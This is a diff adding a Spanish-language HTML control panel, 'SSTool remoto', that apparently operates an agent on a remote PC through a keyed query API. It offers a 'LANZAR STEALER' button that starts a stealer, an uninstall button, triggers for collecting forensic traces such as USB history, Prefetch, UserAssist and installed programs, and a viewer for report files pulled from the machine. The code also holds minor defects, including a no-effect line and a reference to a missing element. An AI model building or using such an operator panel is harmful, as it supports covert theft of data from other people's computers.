@@ -1,0 +1,55 @@
+<!doctype html><html><head><meta charset=utf-8>
+<meta name=viewport content='width=device-width,initial-scale=1'>
+<title>SSTool</title><style>
+body{background:#12100d;color:#e8dcc8;font-family:system-ui;margin:0;padding:14px}
+h1{font-size:19px;margin:2px 0 10px}
+.st{font-size:12px;opacity:.7;margin-bottom:12px}
+.card{background:#1d1912;border:1px solid #3a2e1c;border-radius:12px;padding:12px;margin-bottom:10px}
+.row{display:flex;align-items:center;justify-content:space-between;gap:8px}
+.n{font-weight:700;font-size:15px}
+button{border:1px solid #f0b040;background:#241e14;color:#f0b040;border-radius:9px;padding:9px 14px;font-weight:700;font-size:13px;width:100%;margin-top:6px}
+.steal{background:#5c1d0e;border-color:#e06030;color:#ffb080}
+.v{font-size:13px;opacity:.85}
+</style></head><body>
+<h1>SSTOOL <span style='font-size:11px;opacity:.6'>remoto</span></h1>
+<div class=st id=st>conectando...</div>
+<div class=card id=statecard>
+ <div class=row><span class=n>STEALER</span><span class=v id=stealer>-</span></div>
+ <button class=steal onclick=run('stealer')>LANZAR STEALER</button>
+ <button onclick=run('clean')>LIMPIAR (desinstalar)</button>
+</div>
+<div class=card>
+ <div class=n>CHEQUEOS</div>
+ <button onclick=run('journal')>1. Journal Tool</button>
+ <button onclick=run('userassist')>2. UserAssist</button>
+ <button onclick=run('usb')>3. USB</button>
+ <button onclick=run('lav')>4. LastActivityView</button>
+ <button onclick=run('wpv')>5. WinPrefetchView</button>
+ <button onclick=run('everything')>6. Everything</button>
+ <button onclick=run('si')>7. SystemInformer</button>
+ <button onclick=run('bam')>9. BamParser</button>
+ <button onclick=run('installed')>8. Programas</button>
+</div>
+<div class=card>
+ <div class=n>REPORTES</div>
+ <div id=files class=st>cargando...</div>
+</div>
+<script>
+var K='KKEY';
+function run(op){ fetch('?k='+K+'&api=run&op='+op).then(function(r){return r.json()}).then(refresh); }
+function read(f){ window.open('?k='+K+'&api=file&f='+encodeURIComponent(f)); }
+function refresh(){
+ fetch('?k='+K+'&api=status').then(function(r){return r.json()}).then(function(s){
+  if(s.ok===false){document.getElementById('st').textContent='sin conexion con la PC';return;}
+  document.getElementById('st').textContent='SSTool remoto activo';
+  document.getElementById('stealer').textContent = s.stealer ? 'corriendo' : 'detenido';
+  document.getElementById('statecard').firstElementChild.nextElementSibling;
+  var last=document.getElementById('last'); if(last) last.textContent=s.last;
+  var fl='';
+  for(var i=0;i<s.files.length;i++){ var f=s.files[i];
+   fl+='<div class=row><span class=v>'+f+'</span><button style=width:auto;padding:5px 10px onclick=read(\''+f+'\')>ver</button></div>'; }
+  document.getElementById('files').innerHTML=fl||'(sin reportes todavia)';
+ }).catch(function(){document.getElementById('st').textContent='sin conexion con la PC';});
+}
+refresh(); setInterval(refresh,2500);
+</script></body></html>
